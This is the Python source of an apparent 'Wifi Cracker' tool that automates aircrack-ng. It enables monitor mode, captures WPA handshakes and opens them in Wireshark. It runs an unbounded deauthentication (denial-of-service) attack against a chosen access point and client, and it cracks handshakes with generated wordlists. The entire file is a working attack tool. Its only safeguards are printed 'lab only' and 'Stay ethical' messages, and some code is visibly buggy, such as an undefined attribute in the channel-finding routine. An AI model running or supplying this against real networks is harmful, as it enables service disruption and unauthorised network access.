import glob
import shutil
import subprocess
import os
import time
import sys
from .GenCharlist import generate_password
from termcolor import colored
from .mac_address_detector import find_mac_and_state
from .network_scanner import scan_network
from colorama import Fore, Style, init as colorama_init
import getpass
from .animation import Animation
from .Get_AP import find_info_about_ap
from pathlib import Path

colorama_init(autoreset=True)

class Attack:
    def __init__(self, mac='', essid='', iface='wlan0', capture_file='', wordlist='',
             iface_mon='', channel='', band='abg', ip_range=None):
        self.mac = mac 
        self.essid = essid    
        self.iface = iface
        self.capture_file = capture_file
        self.wordlist = wordlist
        self.iface_mon = f"{iface}mon"
        self.channel = channel

        self.band = band
        self.ip_range = ip_range

    def _is_iface_up(self, iface=None):
        iface = iface or self.iface
        try:
            result = subprocess.run(
                ['ip', 'link', 'show', iface],
                capture_output=True,
                text=True
            )
            return "state UP" in result.stdout
        except Exception:
            return False
        
    def ensure_iface_up(self, retries=3, wait=2):
        """
        Ensures that the network interface is UP.
        Tries to restart NetworkManager if it is down.
        """

        iface = self.iface

        print(f"[+] Checking if {iface} is up...")

        for attempt in range(1, retries + 1):

            if self._is_iface_up(iface):
                print(f" Interface {iface} is UP.")
                return True

            print(f"[!] {iface} is DOWN. Attempt {attempt}/{retries}: restarting network services...")
            try:
                self.kill_conflicting_processes()
                self.restart_nm()

            except Exception as e:
                print(f"[!] Could not restart network manager: {e}")

            time.sleep(wait)

        if not self._is_iface_up(iface):
            print(f"[✗] {iface} is still DOWN after {retries} attempts.")
            return False

        print(f" Interface {iface} is UP.")
        return True


    def update_from_system(self):
        essid, chan, bssid = find_info_about_ap()

        if essid is None:
            self.essid = None
            self.mac = None
            self.channel = None
            return None, None, None
        self.essid = self.get_essid()
        self.channel = chan
        self.mac = bssid

        return essid, chan, bssid


    def list_targets(self, max_retries=20):
        if not self.ip_range:
            self.ip_range = input(
                Fore.CYAN + "Enter IP range (e.g., 192.168.1.0/24): " + Style.RESET_ALL
            ).strip()

            if not self.ip_range:
                print(Fore.RED + "[!] No IP range entered. Cannot continue.")
                return None

        retries = 0
        retry_delay = 5

        while retries < max_retries:
            print(Fore.BLUE + f"Scanning network: {self.ip_range} ..." + Style.RESET_ALL)

            scan_output = scan_network(self.ip_range)
            mac_data = find_mac_and_state(scan_output)
            if not mac_data:
                print(Fore.RED + f"[!] No hosts detected. Retrying in {retry_delay}s...")
                try:
                    self.kill_conflicting_processes()
                    self.restart_nm()
                except Exception as e:
                    print(Fore.RED + f"[!] Failed to restart NetworkManager: {e}")
                    return None

                time.sleep(retry_delay)
                retries += 1
                continue
            print(f"{'Index':<6}{'IP Address':<20}{'MAC Address':<20}{'State':<20}{'Device Type'}")
            print("-" * 90)

            indexed_list = list(mac_data.items())
            for idx, (ip, (mac, state, dev_type)) in enumerate(indexed_list):
                color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                print(f"{idx:<6}{ip:<20}{mac:<20}{color_state:<20}{dev_type}")

            while True:
                try:
                    choice = input(
                        Fore.CYAN + "\nSelect a target by index: " + Style.RESET_ALL
                    ).strip()

                    if not choice.isdigit():
                        print(Fore.RED + "[!] Enter a valid number.")
                        continue

                    choice = int(choice)

                    if 0 <= choice < len(indexed_list):
                        ip, (mac, state, dev_type) = indexed_list[choice]

                        print(Fore.GREEN + f"\n✔ Selected Device:\n"
                                        f"   IP   : {ip}\n"
                                        f"   MAC  : {mac}\n"
                                        f"   State: {state}\n"
                                        f"   Type : {dev_type}\n")

                        self.target_ip = ip
                        self.target_mac = mac
                        self.target_state = state
                        self.target_device = dev_type

                        self.essid = mac

                        return {ip: (mac, state, dev_type)}

                    else:
                        print(Fore.RED + "[!] Index out of range.")

                except KeyboardInterrupt:
                    print(Fore.RED + "\n[!] Selection cancelled.")
                    return None

        print(Fore.RED + "[!] Max retries reached. No targets found.")
        return None
    
    def get_essid(self):
        """Return the currently selected ESSID (after list_targets)."""
        return self.essid
    def get_assets(self):
        BASE_DIR = Path(__file__).resolve().parent
        asset_path = BASE_DIR / "assets"
        return asset_path
    


    def kill_conflicting_processes(self):
        print(Fore.YELLOW + "[*] Checking and killing interfering processes..." + Style.RESET_ALL)
        
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        
        if hasattr(self, "iface_mon") and self.iface_mon:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
            if self.iface_mon in result:
                print(Fore.YELLOW + f"[*] Stopping monitor interface {self.iface_mon}..." + Style.RESET_ALL)
                subprocess.run(["sudo", "airmon-ng", "stop", self.iface_mon])
            else:
                print(Fore.GREEN + f"[*] Monitor interface {self.iface_mon} not found. Nothing to stop." + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "[*] No monitor interface set yet. Skipping stop." + Style.RESET_ALL)


    def find_channel(self):
        self.kill_conflicting_processes()
        if not hasattr(self, "iface_mon") or not self.iface_mon:
            self.iface_mon = f"{self.iface}mon"
        interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout

        if self.iface_mon in interfaces:
            print(Fore.GREEN + f" {self.iface_mon} already in monitor mode." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f"[+] Enabling monitor mode on {self.iface}..." + Style.RESET_ALL)
            subprocess.run(["sudo", "airmon-ng", "start", self.iface])

            interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
            if self.iface_mon not in interfaces:
                print(Fore.RED + f"[!] Failed to enable monitor mode ({self.iface_mon} not found)." + Style.RESET_ALL)
                return
            print(Fore.GREEN + f" Monitor mode active on {self.iface_mon}" + Style.RESET_ALL)

        command = (
            f"airodump-ng {self.iface_mon} "
            f"-d {self.mac_} "
            f"-c {self.channel}; "
            "echo 'Press Enter to exit...'; read"
        )

        print(Fore.YELLOW + "[+] Launching airodump-ng to find/stabilize channel..." + Style.RESET_ALL)
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def cap_handshake(self):
        print(Fore.YELLOW + f"[+] Enabling monitor mode on {self.iface}..." + Style.RESET_ALL)
        subprocess.run(["sudo", "airmon-ng", "start", self.iface])
        if not self.iface_mon:
            self.iface_mon = f"{self.iface}mon"

        result = subprocess.run(["ip", "link"], capture_output=True, text=True)

        if self.iface_mon not in result.stdout:
            print(Fore.RED + f"[!] Monitor interface {self.iface_mon} not found." + Style.RESET_ALL)
            print(Fore.RED + "[!] airmon-ng may have failed to create monitor mode." + Style.RESET_ALL)
            return

        print(Fore.GREEN + f" Monitor mode active on: {self.iface_mon}" + Style.RESET_ALL)
        command = (
            f"airodump-ng {self.iface_mon} "
            f"-d {self.mac} "
            f"-c {self.channel} "
            f"-w {self.capture_file}; "
            "echo 'Press Enter to exit...'; read"
        )

        print(Fore.YELLOW + "[+] Launching airodump-ng to capture handshake..." + Style.RESET_ALL)
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def dos(self):
        if not self.iface_mon:
            print(Fore.YELLOW + f"[+] Monitor interface not set. Starting monitor mode on {self.iface}..." + Style.RESET_ALL)
            subprocess.run(["sudo", "airmon-ng", "start", self.iface])
            self.iface_mon = f"{self.iface}mon"
        result = subprocess.run(["ip", "link"], capture_output=True, text=True)
        if self.iface_mon not in result.stdout:
            print(Fore.RED + f"[!] Monitor interface {self.iface_mon} not found. Cannot run deauth." + Style.RESET_ALL)
            return

        self.essid = self.get_essid()
        if not self.essid:
            print(Fore.RED + "[!] ESSID not found. Cannot run deauth." + Style.RESET_ALL)
            return
        if not self.essid:
            self.essid = "00:00:00:00:00:00"
        command = f"aireplay-ng --deauth 0 -a {self.mac} {self.iface_mon} -c {self.essid}; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])

    def crack(self):
        if not self.wordlist:
            print("[!] Error: Please specify a dictionary file (-w).")
            return
        if not self.mac:
            print("[!] Error: MAC address (-b) is missing.")
            return

        assets_dir = self.get_assets()

        cap_files = [
            f for f in os.listdir(assets_dir)
            if f.startswith(self.capture_file) and f.endswith(".cap")
        ]

        if not cap_files:
            print(f"[!] Error: No .cap capture files found for base '{self.capture_file}' in {assets_dir}.")
            return

        cap_files.sort()
        cap_file = os.path.join(assets_dir, cap_files[-1])
        print(f"[+] Using capture file: {cap_file}")

        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} \"{cap_file}\"; echo 'Press Enter to exit...'; read"
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command])


        
    def generate_pass(self, monster, filepasswords):
        self.monster = monster
        self.filepasswords = filepasswords
        subprocess.run(['crunch', '10', '10', '-t', self.monster, '-o', self.filepasswords])
        
    def restart_nm(self):
        subprocess.run(['systemctl', 'restart', 'NetworkManager'])
        

    
    def channeloriented(self):
        if not self.iface_mon:
            self.iface_mon = f"{self.iface}mon"
            print(Fore.YELLOW + f"[*] Monitor interface not set. Assuming {self.iface_mon}" + Style.RESET_ALL)
        if not self.mac:
            print(Fore.RED + "[!] MAC/BSSID not set. Cannot run airodump-ng." + Style.RESET_ALL)
            return
        if not self.channel:
            print(Fore.RED + "[!] Channel not set. Cannot run airodump-ng." + Style.RESET_ALL)
            return
        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -b {self.channel} -band {self.band}'
        print(Fore.YELLOW + f"[*] Launching airodump-ng on {self.iface_mon}, BSSID {self.mac}, channel {self.channel}..." + Style.RESET_ALL)
        subprocess.run(["gnome-terminal", "--", "bash", "-c", f"{command_str}; echo 'Press Enter to exit...'; read"])
   
   
    
    def wireshark_EAPOL(self):
        assets_path = self.get_assets()
        cap_files = [
            f for f in os.listdir(assets_path)
            if f.startswith(self.capture_file) and f.endswith(".cap")
        ]

        if not cap_files:
            print(Fore.RED + f"[!] No .cap files found for base '{self.capture_file}' in assets/. Cannot open Wireshark.")
            return
        cap_files.sort()
        cap_file = cap_files[-1]
        cap_full_path = os.path.join(assets_path, cap_file)
        print(Fore.GREEN + f"[+] Opening Wireshark for: {cap_full_path}")
        command_str = f'wireshark "{cap_full_path}" -Y "eapol"; echo "Press Enter to exit..."; read'
        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])

  
    def call(self):
        if self.mac is None:
            print(Fore.RED + "Failed to retrieve AP information." + Style.RESET_ALL)
            return

        print(Fore.GREEN + f" AP Selected:" + Style.RESET_ALL)
        print(f"   SSID   : {self.essid}")
        print(f"   BSSID  : {self.mac}")
        print(f"   Channel: {self.channel}")

  
    @staticmethod
    def menu():
        header = (
            Fore.MAGENTA + Style.BRIGHT +
            "\n========================================\n"
            "            Attack Menu \n"
            "========================================" +
            Style.RESET_ALL
        )

        print(header)

        print(Fore.CYAN + "   1 " + Fore.WHITE + "│ " + Fore.YELLOW + "Find Info About AP  (run this first)")
        print(Fore.CYAN + "   2 " + Fore.WHITE + "│ " + Fore.YELLOW + "Capture Handshake  (second)")
        print(Fore.CYAN + "   3 " + Fore.WHITE + "│ " + Fore.YELLOW + "Denial of Service (DoS)")
        print(Fore.CYAN + "   4 " + Fore.WHITE + "│ " + Fore.YELLOW + "Crack Handshake")
        print(Fore.CYAN + "   5 " + Fore.WHITE + "│ " + Fore.YELLOW + "Generate Password List (optional)")
        print(Fore.CYAN + "   6 " + Fore.WHITE + "│ " + Fore.YELLOW + "Open EAPOL in Wireshark")
        print(Fore.CYAN + "   x "+ Fore.WHITE + "│ " + Fore.YELLOW + "Restart Network Manager")
        

        print(
            Fore.CYAN + "   0 " + Fore.WHITE + "│ "
            + Fore.RED + Style.BRIGHT + "Exit"
            + Style.RESET_ALL
        )

        choice = input(
            Fore.GREEN + Style.BRIGHT + "\n ➤ Enter your choice: " + Style.RESET_ALL
        ).strip()

        return choice




def main():
    try:
        Animation.animated_banner("Wifi Cracker", "Author: cyb2rS2c", frames=8, delay=0.1)
        iface = input(
            Fore.CYAN + "Enter your interface (e.g. wlan0): " + Style.RESET_ALL
        ).strip()

        if not iface:
            iface = "wlan0"
            print(Fore.YELLOW + f"No interface entered. Using default: {iface}")

        iface_mon = f"{iface}mon" or {iface}

        capture_file = input(
            Fore.CYAN + "Enter capture filename base (e.g. session1): " + Style.RESET_ALL
        ).strip()

        if not capture_file:
            capture_file = "session1"
            print(Fore.YELLOW + f"No filename entered. Using default: {capture_file}")

        attack = Attack(
            mac="",
            essid="",
            iface=iface,
            capture_file=capture_file,
            wordlist="",
            iface_mon=iface_mon,
            channel="",
            band="abg",
            ip_range=None
        )

        while not attack.ensure_iface_up():
            print("[!] Interface still down. Retrying...")
            time.sleep(2)
        try:
            _, chan, mac = attack.update_from_system()
            essid = attack.get_essid()

            if mac:
                attack.mac = mac
            if essid:
                attack.essid = essid
            if chan:
                attack.channel = chan

        except Exception as e:
            print(Fore.RED + f"[!] Could not read system info: {e}")

        print(Fore.CYAN + "Scanning for nearby network hosts..." + Style.RESET_ALL)

        while True:
            hosts = attack.list_targets()

            if hosts:
                print(Fore.GREEN + f"[+] Hosts found: {len(hosts)}")
                break

            print(Fore.RED + "No hosts found. Retrying...")
            time.sleep(2)

        if not attack.mac:
            print(Fore.RED + "[!] No MAC found or entered. Cannot continue.")
            return

        choice = input(
            Fore.BLUE + "Do you have a wordlist? Type 'yes' or press Enter to create one: "
            + Style.RESET_ALL
        ).strip().lower()

        wordlist = None

        if choice == "yes":
            wl = input(Fore.CYAN + "Enter path to wordlist: " + Style.RESET_ALL).strip()

            if wl and os.path.exists(wl):
                wordlist = wl
            else:
                print(Fore.RED + "Wordlist not found. Switching to auto-generate mode.")
                choice = ""

        if choice != "yes":
            print(Fore.YELLOW + "  Auto-generating wordlist...")

            base_word = getpass.getpass(
                Fore.CYAN + "Enter part of password: " + Style.RESET_ALL
            ).strip()

            if not base_word:
                base_word = "password"
                print(Fore.YELLOW + "  No input. Using default: password")

         
            assets_path = attack.get_assets()
            os.makedirs(assets_path, exist_ok=True)

            wordlist = os.path.join(assets_path, "generated_password.txt")

            generate_password(base_word, wordlist)

            print(Fore.GREEN + f"[+] Wordlist saved to: {wordlist}")

        attack.wordlist = wordlist

        while True:
            choice = Attack.menu()
            if choice == "1":
                print(Fore.YELLOW + "Step 1: Using existing network info" + Style.RESET_ALL)
                attack.call()

                if not attack.channel:
                    print(Fore.YELLOW + "[!] No channel detected. Using default band: abg" + Style.RESET_ALL)
                    attack.band = "abg"
                    attack.channeloriented()
                else:
                    print(Fore.GREEN + " Channel and BSSID OK" + Style.RESET_ALL)

            elif choice == "2":
                if not attack.channel:
                    print(Fore.RED + "[!] No channel known. Use option 2 first." + Style.RESET_ALL)
                    continue

                print(Fore.GREEN + f"[+] Using channel {attack.channel} for handshake capture" + Style.RESET_ALL)
                attack.cap_handshake()

            elif choice == "3":
                attack.iface_mon = iface_mon
                print(Fore.RED + "  Launching deauthentication attack (simulation/lab only!)")
                attack.dos()

            elif choice == "4":
                BASE_DIR = Path(__file__).resolve().parent
                ASSETS_DIR = BASE_DIR / "assets"
                ASSETS_DIR.mkdir(parents=True, exist_ok=True)
                for pattern in ("*.csv", "*.netxml", "*.cap"):
                    for file in Path.cwd().glob(pattern):
                        dst = ASSETS_DIR / file.name
                        if not dst.exists():
                            shutil.move(str(file), str(dst))

                result_file = f"{attack.capture_file}-01.cap"
                cap_file_path = ASSETS_DIR / result_file

                if cap_file_path.exists():
                    print(Fore.GREEN + f"[+] Capture file found: {cap_file_path}")
                    attack.crack()
                else:
                    print(Fore.RED + f"[!] Capture file not found: {cap_file_path}")
            elif choice == "5":
                monster = input(
                    Fore.CYAN + "Enter pattern (e.g. abc%%%%%%): " + Style.RESET_ALL
                ).strip()

                if not monster:
                    monster = "abc%%%%%%"
                    print(Fore.YELLOW + "Using default pattern: abc%%%%%%")

                fname = input(
                    Fore.CYAN + "Enter output filename (assets/): " + Style.RESET_ALL
                ).strip()

                if not fname:
                    fname = "generated_passwords.txt"
                fname = Path(fname).name
                BASE_DIR = Path(__file__).resolve().parent
                ASSETS_DIR = BASE_DIR / "assets"
                ASSETS_DIR.mkdir(parents=True, exist_ok=True)

                out = ASSETS_DIR / fname

                attack.generate_pass(monster, str(out))

                print(Fore.GREEN + f"[+] Passwords saved to {out}")


            elif choice == "6":
                print(Fore.BLUE + "Opening Wireshark to inspect EAPOL…" + Style.RESET_ALL)
                attack.wireshark_EAPOL()

            elif choice == "x":
                print(Fore.CYAN + "Restarting Network Manager…" + Style.RESET_ALL)
                attack.kill_conflicting_processes()
                attack.restart_nm()
                print(Fore.GREEN + " Network Manager restarted" + Style.RESET_ALL)

            elif choice == "0":
                print(Fore.MAGENTA + "Exiting… Stay ethical!" + Style.RESET_ALL)
                break

            else:
                print(Fore.RED + "Invalid choice." + Style.RESET_ALL)

    except KeyboardInterrupt:
        print(Fore.MAGENTA + "\nExiting gracefully (CTRL+C pressed)." + Style.RESET_ALL)
        sys.exit(0)
        
if __name__ == "__main__":
    main()
